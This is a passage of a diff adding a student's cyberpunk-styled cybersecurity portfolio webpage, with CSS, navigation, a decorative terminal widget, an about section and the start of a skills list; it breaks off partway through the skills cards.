@@ -1,0 +1,1512 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Gyanendra Singh Shakya | Cybersecurity Portfolio</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;400;600;700&display=swap" rel="stylesheet">
+  <style>
+    /* ===== CSS VARIABLES & RESET ===== */
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --bg:        #030a03;
+      --surface:   #080f08;
+      --card:      #0a140a;
+      --border:    #0d2b0d;
+      --green:     #00ff41;
+      --green-dim: #00c032;
+      --green-faint:#003310;
+      --cyan:      #00d4ff;
+      --cyan-dim:  #0090b8;
+      --red:       #ff3131;
+      --yellow:    #ffe000;
+      --text:      #c8ffc8;
+      --text-dim:  #5a8a5a;
+      --font-mono: 'Share Tech Mono', monospace;
+      --font-head: 'Orbitron', sans-serif;
+      --font-body: 'Rajdhani', sans-serif;
+    }
+
+    html { scroll-behavior: smooth; }
+
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: var(--font-body);
+      font-size: 16px;
+      line-height: 1.6;
+      cursor: none;
+      overflow-x: hidden;
+    }
+
+    /* ===== CUSTOM CURSOR ===== */
+    #cursor {
+      position: fixed; width: 12px; height: 12px;
+      background: var(--green); border-radius: 50%;
+      pointer-events: none; z-index: 9999;
+      transform: translate(-50%,-50%);
+      transition: transform .1s, opacity .2s;
+      box-shadow: 0 0 10px var(--green), 0 0 25px var(--green);
+    }
+    #cursor-ring {
+      position: fixed; width: 36px; height: 36px;
+      border: 1px solid var(--green); border-radius: 50%;
+      pointer-events: none; z-index: 9998;
+      transform: translate(-50%,-50%);
+      transition: transform .15s ease, width .2s, height .2s, opacity .3s;
+      opacity: .5;
+    }
+
+    /* ===== MATRIX CANVAS ===== */
+    #matrix-canvas {
+      position: fixed; top: 0; left: 0;
+      width: 100%; height: 100%;
+      z-index: 0; opacity: .07;
+      pointer-events: none;
+    }
+
+    /* ===== SCROLLBAR ===== */
+    ::-webkit-scrollbar { width: 6px; }
+    ::-webkit-scrollbar-track { background: var(--bg); }
+    ::-webkit-scrollbar-thumb { background: var(--green-dim); border-radius: 3px; }
+
+    /* ===== NAVBAR ===== */
+    nav {
+      position: fixed; top: 0; width: 100%; z-index: 1000;
+      background: rgba(3,10,3,.92);
+      backdrop-filter: blur(12px);
+      border-bottom: 1px solid var(--border);
+      display: flex; align-items: center; justify-content: space-between;
+      padding: 0 3rem; height: 64px;
+    }
+    .nav-logo {
+      font-family: var(--font-head); font-size: .85rem;
+      color: var(--green); letter-spacing: 2px;
+      text-decoration: none;
+    }
+    .nav-logo span { color: var(--cyan); }
+    .nav-links { display: flex; gap: 2rem; list-style: none; }
+    .nav-links a {
+      font-family: var(--font-mono); font-size: .78rem;
+      color: var(--text-dim); text-decoration: none;
+      letter-spacing: 1px; transition: color .2s;
+      position: relative;
+    }
+    .nav-links a::before {
+      content: '> '; color: var(--green); opacity: 0;
+      transition: opacity .2s;
+    }
+    .nav-links a:hover { color: var(--green); }
+    .nav-links a:hover::before { opacity: 1; }
+
+    .hamburger { display: none; flex-direction: column; gap: 5px; cursor: pointer; }
+    .hamburger span { width: 24px; height: 2px; background: var(--green); transition: .3s; }
+
+    /* ===== SECTIONS GENERAL ===== */
+    section { position: relative; z-index: 1; }
+
+    .section-inner {
+      max-width: 1100px; margin: 0 auto;
+      padding: 100px 2rem 60px;
+    }
+
+    .section-label {
+      font-family: var(--font-mono); font-size: .72rem;
+      color: var(--green); letter-spacing: 4px;
+      margin-bottom: .5rem;
+    }
+    .section-title {
+      font-family: var(--font-head); font-size: 2.2rem;
+      font-weight: 900; line-height: 1.1;
+      margin-bottom: 1rem;
+    }
+    .section-divider {
+      width: 60px; height: 2px;
+      background: linear-gradient(90deg, var(--green), transparent);
+      margin-bottom: 2.5rem;
+    }
+
+    /* ===== HOME ===== */
+    #home {
+      min-height: 100vh;
+      display: flex; align-items: center;
+      padding-top: 64px;
+    }
+    .home-inner {
+      max-width: 1100px; margin: 0 auto;
+      padding: 0 2rem;
+      display: grid; grid-template-columns: 1fr 1fr;
+      gap: 3rem; align-items: center;
+    }
+
+    .home-badge {
+      display: inline-flex; align-items: center; gap: .5rem;
+      font-family: var(--font-mono); font-size: .72rem;
+      color: var(--green); background: var(--green-faint);
+      border: 1px solid var(--border);
+      padding: .35rem .9rem; border-radius: 2px;
+      margin-bottom: 1.5rem;
+      animation: fadeSlideUp .6s ease both;
+    }
+    .home-badge .dot {
+      width: 7px; height: 7px; border-radius: 50%;
+      background: var(--green);
+      animation: blink 1.2s infinite;
+    }
+
+    @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0} }
+
+    .home-name {
+      font-family: var(--font-head); font-size: clamp(2rem, 5vw, 3.6rem);
+      font-weight: 900; line-height: 1.05;
+      animation: fadeSlideUp .7s .1s ease both;
+    }
+    .home-name .highlight { color: var(--green); }
+    .home-name .highlight2 { color: var(--cyan); }
+
+    .home-tagline {
+      font-family: var(--font-mono); font-size: clamp(.85rem, 2vw, 1.1rem);
+      color: var(--cyan); margin: 1rem 0 1.5rem;
+      animation: fadeSlideUp .7s .2s ease both;
+    }
+    .typing-cursor { animation: blink .7s infinite; }
+
+    .home-desc {
+      font-size: 1.05rem; color: var(--text-dim);
+      max-width: 480px; line-height: 1.7;
+      animation: fadeSlideUp .7s .3s ease both;
+    }
+
+    .home-cta {
+      display: flex; gap: 1rem; margin-top: 2rem; flex-wrap: wrap;
+      animation: fadeSlideUp .7s .4s ease both;
+    }
+    .btn-primary {
+      font-family: var(--font-mono); font-size: .82rem;
+      padding: .7rem 1.8rem; border: 1px solid var(--green);
+      color: var(--bg); background: var(--green);
+      text-decoration: none; letter-spacing: 1px;
+      transition: all .25s; cursor: none;
+      clip-path: polygon(8px 0%, 100% 0%, calc(100% - 8px) 100%, 0% 100%);
+    }
+    .btn-primary:hover { background: var(--green-dim); box-shadow: 0 0 20px var(--green); }
+    .btn-outline {
+      font-family: var(--font-mono); font-size: .82rem;
+      padding: .7rem 1.8rem; border: 1px solid var(--green-dim);
+      color: var(--green); background: transparent;
+      text-decoration: none; letter-spacing: 1px;
+      transition: all .25s; cursor: none;
+      clip-path: polygon(8px 0%, 100% 0%, calc(100% - 8px) 100%, 0% 100%);
+    }
+    .btn-outline:hover { background: var(--green-faint); border-color: var(--green); }
+
+    /* Terminal widget */
+    .home-terminal {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 4px;
+      overflow: hidden;
+      animation: fadeSlideUp .8s .3s ease both;
+      box-shadow: 0 0 40px rgba(0,255,65,.05), inset 0 0 80px rgba(0,0,0,.5);
+    }
+    .terminal-bar {
+      background: #111a11;
+      padding: .55rem 1rem;
+      display: flex; align-items: center; gap: .6rem;
+      border-bottom: 1px solid var(--border);
+    }
+    .terminal-bar .t-dot { width: 10px; height: 10px; border-radius: 50%; }
+    .t-red { background: #ff5f56; } .t-yellow { background: #ffbd2e; } .t-green { background: #27c93f; }
+    .terminal-bar .t-title {
+      font-family: var(--font-mono); font-size: .72rem;
+      color: var(--text-dim); margin-left: .5rem;
+    }
+    .terminal-body { padding: 1.5rem; font-family: var(--font-mono); font-size: .8rem; line-height: 2; }
+    .t-line { display: flex; gap: .5rem; }
+    .t-prompt { color: var(--green); flex-shrink: 0; }
+    .t-cmd { color: var(--text); }
+    .t-output { color: var(--text-dim); padding-left: 1.2rem; }
+    .t-highlight { color: var(--cyan); }
+    .t-warn { color: var(--yellow); }
+    .t-cursor-line .t-cmd::after { content: '▋'; animation: blink .7s infinite; color: var(--green); }
+
+    @keyframes fadeSlideUp {
+      from { opacity: 0; transform: translateY(24px); }
+      to   { opacity: 1; transform: translateY(0); }
+    }
+
+    /* Scan line overlay */
+    .scanlines {
+      position: fixed; top: 0; left: 0;
+      width: 100%; height: 100%; z-index: 2;
+      pointer-events: none;
+      background: repeating-linear-gradient(
+        0deg,
+        transparent,
+        transparent 2px,
+        rgba(0,0,0,.07) 2px,
+        rgba(0,0,0,.07) 4px
+      );
+    }
+
+    /* ===== ABOUT ===== */
+    #about { background: var(--surface); border-top: 1px solid var(--border); border-bottom: 1px solid var(--border); }
+
+    .about-grid {
+      display: grid; grid-template-columns: 1fr 1.6fr;
+      gap: 3rem; align-items: start;
+    }
+
+    .about-avatar-wrap {
+      position: relative; display: inline-block;
+    }
+    .about-avatar {
+      width: 100%; max-width: 280px;
+      aspect-ratio: 1;
+      border: 2px solid var(--green);
+      background: var(--card);
+      display: flex; align-items: center; justify-content: center;
+      position: relative; overflow: hidden;
+    }
+    .about-avatar::before {
+      content: '';
+      position: absolute; inset: 0;
+      background: linear-gradient(135deg, rgba(0,255,65,.08), transparent 60%);
+    }
+    .avatar-initials {
+      font-family: var(--font-head); font-size: 4rem;
+      font-weight: 900; color: var(--green);
+      letter-spacing: -2px;
+      text-shadow: 0 0 30px var(--green);
+    }
+    .corner-tl, .corner-br {
+      position: absolute; width: 20px; height: 20px;
+      border-color: var(--cyan); border-style: solid;
+    }
+    .corner-tl { top: -4px; left: -4px; border-width: 2px 0 0 2px; }
+    .corner-br { bottom: -4px; right: -4px; border-width: 0 2px 2px 0; }
+
+    .about-id-card {
+      margin-top: 1rem;
+      background: var(--card); border: 1px solid var(--border);
+      padding: .8rem 1rem;
+      font-family: var(--font-mono); font-size: .72rem;
+    }
+    .about-id-row { display: flex; gap: .5rem; margin-bottom: .3rem; }
+    .about-id-label { color: var(--text-dim); flex-shrink: 0; width: 80px; }
+    .about-id-value { color: var(--green); }
+
+    .about-bio {
+      font-size: 1.05rem; color: var(--text); line-height: 1.8;
+      margin-bottom: 1.5rem;
+    }
+    .about-bio span { color: var(--green); font-weight: 700; }
+
+    .about-stats {
+      display: grid; grid-template-columns: repeat(3, 1fr); gap: 1rem;
+      margin-top: 1.5rem;
+    }
+    .stat-card {
+      background: var(--card); border: 1px solid var(--border);
+      padding: 1rem; text-align: center;
+      transition: border-color .25s;
+    }
+    .stat-card:hover { border-color: var(--green); }
+    .stat-num {
+      font-family: var(--font-head); font-size: 1.8rem;
+      color: var(--green); font-weight: 900;
+    }
+    .stat-label { font-family: var(--font-mono); font-size: .68rem; color: var(--text-dim); margin-top: .2rem; }
+
+    /* ===== SKILLS ===== */
+    #skills { background: var(--bg); }
+
+    .skills-grid {
+      display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+      gap: 1.5rem;
+    }
+    .skill-card {
+      background: var(--card); border: 1px solid var(--border);
+      padding: 1.5rem;
+      transition: border-color .25s, transform .25s, box-shadow .25s;
+      position: relative; overflow: hidden;
+    }
+    .skill-card::before {
+      content: ''; position: absolute; top: 0; left: 0;
+      width: 3px; height: 100%;
+      background: var(--green);
+      transform: scaleY(0); transform-origin: bottom;
+      transition: transform .3s;
+    }
+    .skill-card:hover { border-color: var(--green); transform: translateY(-4px); box-shadow: 0 8px 30px rgba(0,255,65,.08); }
+    .skill-card:hover::before { transform: scaleY(1); }
+    .skill-icon { font-size: 1.8rem; margin-bottom: .8rem; }
+    .skill-name {
+      font-family: var(--font-head); font-size: .95rem; font-weight: 700;
+      color: var(--green); margin-bottom: .5rem;
+    }
+    .skill-desc { font-size: .9rem; color: var(--text-dim); margin-bottom: 1rem; line-height: 1.6; }
+    .skill-bar-wrap { background: var(--surface); height: 4px; border-radius: 2px; overflow: hidden; }
+    .skill-bar {
+      height: 100%; background: linear-gradient(90deg, var(--green), var(--cyan));
+      border-radius: 2px; width: 0%;
+      transition: width 1.2s cubic-bezier(.25,.46,.45,.94);
+    }
+    .skill-pct { font-family: var(--font-mono); font-size: .68rem; color: var(--text-dim); margin-top: .3rem; text-align: right; }
+
+    .tools-section { margin-top: 3rem; }
+    .tools-title { font-family: var(--font-mono); font-size: .75rem; color: var(--text-dim); letter-spacing: 3px; margin-bottom: 1rem; }
+    .tools-wrap { display: flex; flex-wrap: wrap; gap: .7rem; }
+    .tool-tag {
+      font-family: var(--font-mono); font-size: .72rem;
+      padding: .35rem .9rem; border: 1px solid var(--border);
+      color: var(--text-dim); background: var(--card);
+      transition: all .2s; cursor: default;
+    }
+    .tool-tag:hover { border-color: var(--cyan); color: var(--cyan); background: rgba(0,212,255,.05); }
+
+    /* ===== PROJECTS ===== */
+    #projects { background: var(--surface); border-top: 1px solid var(--border); border-bottom: 1px solid var(--border); }
+
+    .projects-grid {
+      display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
+      gap: 1.5rem;
+    }
+    .project-card {
+      background: var(--card); border: 1px solid var(--border);
+      overflow: hidden;
+      transition: border-color .25s, transform .25s, box-shadow .25s;
+    }
+    .project-card:hover { border-color: var(--green); transform: translateY(-5px); box-shadow: 0 10px 35px rgba(0,255,65,.08); }
+    .project-banner {
+      background: var(--surface); height: 130px;
+      display: flex; align-items: center; justify-content: center;
+      border-bottom: 1px solid var(--border);
+      font-size: 3.5rem; position: relative; overflow: hidden;
+    }
+    .project-banner::after {
+      content: ''; position: absolute; inset: 0;
+      background: linear-gradient(135deg, rgba(0,255,65,.05), rgba(0,212,255,.05));
+    }
+    .project-body { padding: 1.3rem; }
+    .project-tags { display: flex; gap: .5rem; flex-wrap: wrap; margin-bottom: .8rem; }
+    .project-tag {
+      font-family: var(--font-mono); font-size: .64rem;
+      padding: .2rem .6rem; border: 1px solid var(--border);
+      color: var(--green); background: var(--green-faint);
+    }
+    .project-name {
+      font-family: var(--font-head); font-size: 1rem; font-weight: 700;
+      color: var(--text); margin-bottom: .6rem;
+    }
+    .project-desc { font-size: .9rem; color: var(--text-dim); line-height: 1.6; }
+    .project-footer { padding: .8rem 1.3rem; border-top: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; }
+    .project-status { font-family: var(--font-mono); font-size: .68rem; display: flex; align-items: center; gap: .4rem; }
+    .status-dot { width: 7px; height: 7px; border-radius: 50%; background: var(--green); animation: blink 1.5s infinite; }
+    .project-link { font-family: var(--font-mono); font-size: .7rem; color: var(--cyan); text-decoration: none; transition: color .2s; }
+    .project-link:hover { color: var(--green); }
+
+    /* ===== BURP SUITE PRACTICALS ===== */
+    #burpsuite { background: var(--bg); }
+
+    .practical-tabs {
+      display: flex; gap: 0; margin-bottom: 2rem;
+      border-bottom: 1px solid var(--border);
+      overflow-x: auto;
+    }
+    .practical-tab {
+      font-family: var(--font-mono); font-size: .75rem;
+      padding: .75rem 1.5rem; background: none;
+      border: none; border-bottom: 2px solid transparent;
+      color: var(--text-dim); cursor: none;
+      transition: all .2s; white-space: nowrap;
+      margin-bottom: -1px;
+    }
+    .practical-tab:hover { color: var(--green); }
+    .practical-tab.active { color: var(--green); border-bottom-color: var(--green); background: var(--green-faint); }
+
+    .practical-panel { display: none; }
+    .practical-panel.active { display: block; animation: fadeSlideUp .4s ease; }
+
+    .practical-header {
+      background: var(--card); border: 1px solid var(--border);
+      border-left: 3px solid var(--green);
+      padding: 1.5rem; margin-bottom: 1.5rem;
+    }
+    .practical-title {
+      font-family: var(--font-head); font-size: 1.4rem; font-weight: 700;
+      color: var(--green); margin-bottom: .5rem;
+    }
+    .practical-objective { font-size: .95rem; color: var(--text-dim); line-height: 1.7; }
+
+    .practical-meta {
+      display: flex; gap: 1rem; flex-wrap: wrap; margin-top: 1rem;
+    }
+    .meta-badge {
+      font-family: var(--font-mono); font-size: .68rem;
+      padding: .25rem .8rem; border: 1px solid var(--border);
+      color: var(--cyan);
+    }
+
+    .practical-section {
+      background: var(--card); border: 1px solid var(--border);
+      padding: 1.3rem; margin-bottom: 1.2rem;
+    }
+    .ps-title {
+      font-family: var(--font-head); font-size: .82rem;
+      color: var(--cyan); letter-spacing: 2px; margin-bottom: 1rem;
+      display: flex; align-items: center; gap: .6rem;
+    }
+    .ps-title::before { content: '//'; color: var(--green-dim); }
+
+    .step-list { list-style: none; padding: 0; }
+    .step-item {
+      display: flex; gap: 1rem; padding: .6rem 0;
+      border-bottom: 1px dashed rgba(255,255,255,.05);
+      font-size: .9rem; color: var(--text-dim); line-height: 1.6;
+      align-items: flex-start;
+    }
+    .step-item:last-child { border-bottom: none; }
+    .step-num {
+      font-family: var(--font-mono); font-size: .72rem;
+      color: var(--green); background: var(--green-faint);
+      border: 1px solid var(--border);
+      width: 26px; height: 26px; flex-shrink: 0;
+      display: flex; align-items: center; justify-content: center;
+      margin-top: 2px;
+    }
+
+    .payload-box {
+      background: #000a00; border: 1px solid var(--border);
+      border-left: 3px solid var(--green);
+      padding: 1rem 1.2rem; margin: .5rem 0;
+      font-family: var(--font-mono); font-size: .82rem;
+      color: var(--green); line-height: 1.8;
+      position: relative; overflow-x: auto;
+    }
+    .payload-label {
+      font-size: .65rem; color: var(--text-dim);
+      margin-bottom: .4rem; letter-spacing: 2px;
+    }
+    .copy-btn {
+      position: absolute; top: .6rem; right: .6rem;
+      font-family: var(--font-mono); font-size: .65rem;
+      color: var(--text-dim); background: var(--surface);
+      border: 1px solid var(--border);
+      padding: .2rem .5rem; cursor: none; transition: color .2s;
+    }
+    .copy-btn:hover { color: var(--green); }
+
+    .result-box {
+      background: var(--card); border: 1px solid var(--border);
+      border-left: 3px solid var(--yellow);
+      padding: 1rem 1.2rem; margin: .5rem 0;
+      font-size: .9rem; color: var(--text-dim); line-height: 1.7;
+    }
+    .result-box strong { color: var(--yellow); font-family: var(--font-mono); font-size: .78rem; }
+
+    .prevention-list { list-style: none; padding: 0; }
+    .prevention-item {
+      display: flex; gap: .8rem; padding: .5rem 0;
+      font-size: .9rem; color: var(--text-dim);
+      align-items: flex-start;
+    }
+    .prevention-item::before { content: '✓'; color: var(--green); flex-shrink: 0; font-family: var(--font-mono); }
+
+    /* ===== CONTACT ===== */
+    #contact { background: var(--surface); border-top: 1px solid var(--border); }
+
+    .contact-grid {
+      display: grid; grid-template-columns: 1fr 1.3fr; gap: 3rem;
+    }
+    .contact-info-item {
+      display: flex; gap: 1rem; align-items: flex-start;
+      padding: 1rem; background: var(--card);
+      border: 1px solid var(--border); margin-bottom: .8rem;
+      transition: border-color .25s;
+    }
+    .contact-info-item:hover { border-color: var(--green); }
+    .ci-icon { font-size: 1.4rem; flex-shrink: 0; }
+    .ci-label { font-family: var(--font-mono); font-size: .68rem; color: var(--text-dim); }
+    .ci-value { font-size: .95rem; color: var(--text); }
+
+    .contact-form { display: flex; flex-direction: column; gap: 1rem; }
+    .form-group { display: flex; flex-direction: column; gap: .35rem; }
+    .form-label { font-family: var(--font-mono); font-size: .7rem; color: var(--text-dim); letter-spacing: 2px; }
+    .form-input, .form-textarea {
+      background: var(--card); border: 1px solid var(--border);
+      color: var(--text); font-family: var(--font-body); font-size: .95rem;
+      padding: .75rem 1rem;
+      outline: none; transition: border-color .25s;
+      width: 100%;
+    }
+    .form-input:focus, .form-textarea:focus { border-color: var(--green); box-shadow: 0 0 12px rgba(0,255,65,.1); }
+    .form-textarea { min-height: 130px; resize: vertical; }
+    .form-submit {
+      font-family: var(--font-mono); font-size: .82rem;
+      padding: .8rem 2rem; background: var(--green);
+      color: var(--bg); border: none; cursor: none;
+      letter-spacing: 2px; transition: all .25s;
+      align-self: flex-start;
+      clip-path: polygon(8px 0%, 100% 0%, calc(100% - 8px) 100%, 0% 100%);
+    }
+    .form-submit:hover { background: var(--green-dim); box-shadow: 0 0 20px var(--green); }
+    .form-msg { font-family: var(--font-mono); font-size: .78rem; color: var(--green); display: none; margin-top: .5rem; }
+
+    /* ===== FOOTER ===== */
+    footer {
+      background: var(--bg); border-top: 1px solid var(--border);
+      padding: 2.5rem 2rem;
+      text-align: center;
+    }
+    .footer-social { display: flex; justify-content: center; gap: 1.2rem; margin-bottom: 1.2rem; }
+    .social-link {
+      font-family: var(--font-mono); font-size: .72rem;
+      color: var(--text-dim); text-decoration: none;
+      padding: .4rem .9rem; border: 1px solid var(--border);
+      transition: all .2s;
+    }
+    .social-link:hover { color: var(--green); border-color: var(--green); background: var(--green-faint); }
+    .footer-text { font-family: var(--font-mono); font-size: .7rem; color: var(--text-dim); }
+    .footer-text span { color: var(--green); }
+
+    /* ===== GLITCH EFFECT ===== */
+    .glitch {
+      position: relative;
+    }
+    .glitch::before, .glitch::after {
+      content: attr(data-text);
+      position: absolute; top: 0; left: 0;
+      width: 100%; height: 100%;
+      font-family: inherit; font-size: inherit;
+      font-weight: inherit; color: inherit;
+    }
+    .glitch::before {
+      left: 2px; text-shadow: -1px 0 var(--red);
+      animation: glitch1 3s infinite;
+      clip-path: polygon(0 0, 100% 0, 100% 45%, 0 45%);
+    }
+    .glitch::after {
+      left: -2px; text-shadow: -1px 0 var(--cyan);
+      animation: glitch2 3s infinite;
+      clip-path: polygon(0 60%, 100% 60%, 100% 100%, 0 100%);
+    }
+    @keyframes glitch1 {
+      0%,85%,87%,100% { transform: none; opacity: 0; }
+      86% { transform: translate(-2px, 1px) skew(2deg); opacity: .8; }
+    }
+    @keyframes glitch2 {
+      0%,85%,87%,100% { transform: none; opacity: 0; }
+      86% { transform: translate(2px, -1px) skew(-2deg); opacity: .8; }
+    }
+
+    /* ===== RESPONSIVE ===== */
+    @media (max-width: 900px) {
+      .home-inner { grid-template-columns: 1fr; }
+      .about-grid { grid-template-columns: 1fr; }
+      .contact-grid { grid-template-columns: 1fr; }
+      .about-stats { grid-template-columns: repeat(3,1fr); }
+    }
+    @media (max-width: 700px) {
+      nav { padding: 0 1.2rem; }
+      .nav-links { display: none; flex-direction: column; position: absolute; top: 64px; left: 0; width: 100%; background: rgba(3,10,3,.98); padding: 1.5rem; gap: 1rem; border-bottom: 1px solid var(--border); }
+      .nav-links.open { display: flex; }
+      .hamburger { display: flex; }
+      .section-inner { padding: 80px 1.2rem 50px; }
+      .home-inner { padding: 0 1.2rem; }
+      .section-title { font-size: 1.7rem; }
+      .about-stats { grid-template-columns: repeat(3,1fr); gap: .6rem; }
+      .stat-num { font-size: 1.4rem; }
+      .practical-tab { padding: .6rem .9rem; font-size: .7rem; }
+      body { cursor: auto; }
+      #cursor, #cursor-ring { display: none; }
+    }
+    @media (max-width: 480px) {
+      .home-cta { flex-direction: column; }
+      .btn-primary, .btn-outline { text-align: center; }
+      .about-stats { grid-template-columns: repeat(3,1fr); }
+      .footer-social { flex-wrap: wrap; }
+    }
+
+    /* Scroll reveal */
+    .reveal { opacity: 0; transform: translateY(30px); transition: opacity .7s ease, transform .7s ease; }
+    .reveal.visible { opacity: 1; transform: translateY(0); }
+  </style>
+</head>
+<body>
+
+<!-- Matrix Canvas -->
+<canvas id="matrix-canvas"></canvas>
+
+<!-- Scanlines -->
+<div class="scanlines"></div>
+
+<!-- Custom cursor -->
+<div id="cursor"></div>
+<div id="cursor-ring"></div>
+
+<!-- ===== NAVBAR ===== -->
+<nav>
+  <a href="#home" class="nav-logo">GSS<span>::</span>CYBER</a>
+  <ul class="nav-links" id="navLinks">
+    <li><a href="#home">HOME</a></li>
+    <li><a href="#about">ABOUT</a></li>
+    <li><a href="#skills">SKILLS</a></li>
+    <li><a href="#projects">PROJECTS</a></li>
+    <li><a href="#burpsuite">BURP SUITE</a></li>
+    <li><a href="#contact">CONTACT</a></li>
+  </ul>
+  <div class="hamburger" id="hamburger" onclick="toggleNav()">
+    <span></span><span></span><span></span>
+  </div>
+</nav>
+
+<!-- ===== HOME ===== -->
+<section id="home">
+  <div class="home-inner">
+    <div>
+      <div class="home-badge">
+        <span class="dot"></span>
+        AVAILABLE FOR INTERNSHIP / OPPORTUNITIES
+      </div>
+      <h1 class="home-name glitch" data-text="GYANENDRA SINGH SHAKYA">
+        GYANENDRA<br><span class="highlight">SINGH</span> <span class="highlight2">SHAKYA</span>
+      </h1>
+      <p class="home-tagline">
+        &gt; <span id="typed-text"></span><span class="typing-cursor">_</span>
+      </p>
+      <p class="home-desc">
+        Aspiring cybersecurity professional passionate about ethical hacking,
+        penetration testing, and building secure digital environments.
+        Turning vulnerabilities into lessons — one CVE at a time.
+      </p>
+      <div class="home-cta">
+        <a href="#burpsuite" class="btn-primary">VIEW PRACTICALS</a>
+        <a href="#contact" class="btn-outline">GET IN TOUCH</a>
+      </div>
+    </div>
+    <div>
+      <div class="home-terminal">
+        <div class="terminal-bar">
+          <div class="t-dot t-red"></div>
+          <div class="t-dot t-yellow"></div>
+          <div class="t-dot t-green"></div>
+          <span class="t-title">kali@gss-lab: ~</span>
+        </div>
+        <div class="terminal-body">
+          <div class="t-line"><span class="t-prompt">┌──(kali㉿gss-lab)-[~]</span></div>
+          <div class="t-line"><span class="t-prompt">└─$</span> <span class="t-cmd">whoami</span></div>
+          <div class="t-line"><span class="t-output t-highlight">gyanendra_singh_shakya</span></div>
+          <div class="t-line"><span class="t-prompt">└─$</span> <span class="t-cmd">cat role.txt</span></div>
+          <div class="t-line"><span class="t-output">Cybersecurity Enthusiast &amp; Ethical Hacker</span></div>
+          <div class="t-line"><span class="t-prompt">└─$</span> <span class="t-cmd">nmap --skills</span></div>
+          <div class="t-line"><span class="t-output">Scanning... <span class="t-highlight">4 skills found</span></span></div>
+          <div class="t-line"><span class="t-output">&nbsp;&nbsp;[+] Web Penetration Testing</span></div>
+          <div class="t-line"><span class="t-output">&nbsp;&nbsp;[+] Burp Suite / OWASP</span></div>
+          <div class="t-line"><span class="t-output">&nbsp;&nbsp;[+] Network Security</span></div>
+          <div class="t-line"><span class="t-output">&nbsp;&nbsp;[+] Vulnerability Assessment</span></div>
+          <div class="t-line t-cursor-line"><span class="t-prompt">└─$</span> <span class="t-cmd"></span></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== ABOUT ===== -->
+<section id="about">
+  <div class="section-inner">
+    <p class="section-label reveal">// 01. ABOUT</p>
+    <h2 class="section-title reveal">About <span style="color:var(--green)">Me</span></h2>
+    <div class="section-divider reveal"></div>
+    <div class="about-grid">
+      <div class="reveal">
+        <div class="about-avatar-wrap">
+          <div class="about-avatar">
+            <div class="corner-tl"></div>
+            <div class="corner-br"></div>
+            <span class="avatar-initials">GSS</span>
+          </div>
+          <div class="about-id-card">
+            <div class="about-id-row"><span class="about-id-label">NAME:</span><span class="about-id-value">Gyanendra S. Shakya</span></div>
+            <div class="about-id-row"><span class="about-id-label">ROLE:</span><span class="about-id-value">Cyber Sec Student</span></div>
+            <div class="about-id-row"><span class="about-id-label">FOCUS:</span><span class="about-id-value">Ethical Hacking</span></div>
+            <div class="about-id-row"><span class="about-id-label">STATUS:</span><span class="about-id-value" style="color:var(--green)">● ACTIVE</span></div>
+          </div>
+        </div>
+      </div>
+      <div class="reveal">
+        <p class="about-bio">
+          Hi! I'm <span>Gyanendra Singh Shakya</span>, a dedicated cybersecurity student with a strong passion
+          for ethical hacking and web application security. I love exploring how systems work — and how they break.
+        </p>
+        <p class="about-bio">
+          My journey into cybersecurity began with curiosity about how the web functions under the hood.
+          That curiosity led me to <span>Burp Suite</span>, <span>Kali Linux</span>, and the fascinating world
+          of penetration testing. I practice on platforms like <span>DVWA</span>, <span>bWAPP</span>,
+          and <span>HackTheBox</span>.
+        </p>
+        <p class="about-bio">
+          My goal is to contribute to a safer digital world by identifying and responsibly disclosing
+          vulnerabilities, and eventually becoming a professional <span>penetration tester</span>.
+        </p>
+        <div class="about-stats">
+          <div class="stat-card reveal">
+            <div class="stat-num" data-target="10">0</div>
+            <div class="stat-label">PROJECTS</div>
+          </div>
+          <div class="stat-card reveal">
+            <div class="stat-num" data-target="15">0</div>
+            <div class="stat-label">PRACTICALS</div>
+          </div>
+          <div class="stat-card reveal">
+            <div class="stat-num" data-target="5">0</div>
+            <div class="stat-label">TOOLS MASTERED</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== SKILLS ===== -->
+<section id="skills">
+  <div class="section-inner">
+    <p class="section-label reveal">// 02. SKILLS</p>
+    <h2 class="section-title reveal">Technical <span style="color:var(--green)">Arsenal</span></h2>
+    <div class="section-divider reveal"></div>
+    <div class="skills-grid">
+      <div class="skill-card reveal">
+        <div class="skill-icon">🛡️</div>
+        <div class="skill-name">CYBER SECURITY</div>
+        <div class="skill-desc">Threat modeling, vulnerability assessment, and security auditing of systems and networks using industry best practices.</div>
+        <div class="skill-bar-wrap"><div class="skill-bar" data-width="78"></div></div>
+        <div class="skill-pct">78%</div>
+      </div>
+      <div class="skill-card reveal">
+        <div class="skill-icon">🕷️</div>
+        <div class="skill-name">WEB PENETRATION TESTING</div>
+        <div class="skill-desc">Hands-on experience with OWASP Top 10 attacks including SQLi, XSS, CSRF, IDOR, and broken authentication.</div>
+        <div class="skill-bar-wrap"><div class="skill-bar" data-width="82"></div></div>
+        <div class="skill-pct">82%</div>
+      </div>
+      <div class="skill-card reveal">
+        <div class="skill-icon">🔫</div>
+        <div class="skill-name">BURP SUITE</div>
+        <div class="skill-desc">Proficient with Burp Suite Pro — Intercept, Repeater, Intruder, Scanner, and Decoder for web application testing.</div>
+        <div class="skill-bar-wrap"><div class="skill-bar" data-width="85"></div></div>
+        <div class="skill-pct">85%</div>
+      </div>
+      <div class="skill-card reveal">
+        <div class="skill-icon">🌐</div>
+        <div class="skill-name">NETWORKING</div>
+        <div class="skill-desc">TCP/IP, DNS, HTTP/S protocols, Wireshark packet analysis, firewall configuration, and network reconnaissance.</div>
+        <div class="skill-bar-wrap"><div class="skill-bar" data-width="72"></div></div>
+        <div class="skill-pct">72%</div>
+      </div>
+      <div class="skill-card reveal">
+        <div class="skill-icon">🐧</div>
+        <div class="skill-name">LINUX / KALI</div>
